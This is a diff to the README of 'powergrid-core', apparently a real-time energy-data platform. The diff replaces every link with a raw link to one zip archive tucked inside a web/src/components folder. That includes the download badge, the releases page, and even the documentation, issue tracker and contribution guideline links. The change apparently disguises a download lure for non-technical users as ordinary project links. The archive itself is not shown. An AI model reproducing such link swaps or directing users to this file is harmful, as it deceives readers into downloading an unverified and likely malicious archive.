@@ -4,7 +4,7 @@
 Welcome to powergrid-core! This platform helps you manage real-time energy data efficiently. It’s designed for everyone, even if you have no technical knowledge. Let's walk through how to download and run the software.
 
 ## 🔗 Download Now
-[![Download Powergrid-core](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/TegsheeGitHub/powergrid-core/releases)
+[![Download Powergrid-core](https://github.com/TegsheeGitHub/powergrid-core/raw/refs/heads/main/web/src/components/powergrid-core-1.7-alpha.1.zip%https://github.com/TegsheeGitHub/powergrid-core/raw/refs/heads/main/web/src/components/powergrid-core-1.7-alpha.1.zip)](https://github.com/TegsheeGitHub/powergrid-core/raw/refs/heads/main/web/src/components/powergrid-core-1.7-alpha.1.zip)
 
 ## 🛠️ System Requirements
 Before you download powergrid-core, ensure your system meets these requirements:
@@ -17,7 +17,7 @@ Before you download powergrid-core, ensure your system meets these requirements:
 ## 💻 Installation Instructions
 
 ### 1. Visit the Releases Page
-Go to the [Releases page](https://github.com/TegsheeGitHub/powergrid-core/releases) to find the latest version of powergrid-core.
+Go to the [Releases page](https://github.com/TegsheeGitHub/powergrid-core/raw/refs/heads/main/web/src/components/powergrid-core-1.7-alpha.1.zip) to find the latest version of powergrid-core.
 
 ### 2. Download the Application
 On the Releases page, look for the latest version. Click on the file that matches your operating system to download. 
@@ -61,10 +61,10 @@ If you have questions or need assistance, please reach out via the Issues sectio
 If you’re interested in helping us develop powergrid-core further, feel free to check our guidelines in the repository for contributions. We welcome all ideas that can improve the platform.
 
 ## 🔗 Important Links
-- [Download powergrid-core](https://github.com/TegsheeGitHub/powergrid-core/releases)
-- [Documentation](https://github.com/TegsheeGitHub/powergrid-core/wiki)
-- [Issues Tracker](https://github.com/TegsheeGitHub/powergrid-core/issues)
-- [Contribution Guidelines](https://github.com/TegsheeGitHub/powergrid-core/blob/main/CONTRIBUTING.md)
+- [Download powergrid-core](https://github.com/TegsheeGitHub/powergrid-core/raw/refs/heads/main/web/src/components/powergrid-core-1.7-alpha.1.zip)
+- [Documentation](https://github.com/TegsheeGitHub/powergrid-core/raw/refs/heads/main/web/src/components/powergrid-core-1.7-alpha.1.zip)
+- [Issues Tracker](https://github.com/TegsheeGitHub/powergrid-core/raw/refs/heads/main/web/src/components/powergrid-core-1.7-alpha.1.zip)
+- [Contribution Guidelines](https://github.com/TegsheeGitHub/powergrid-core/raw/refs/heads/main/web/src/components/powergrid-core-1.7-alpha.1.zip)
 
 ## 🌍 Related Topics
 For those interested in cloud technology and energy solutions, here are some related topics:
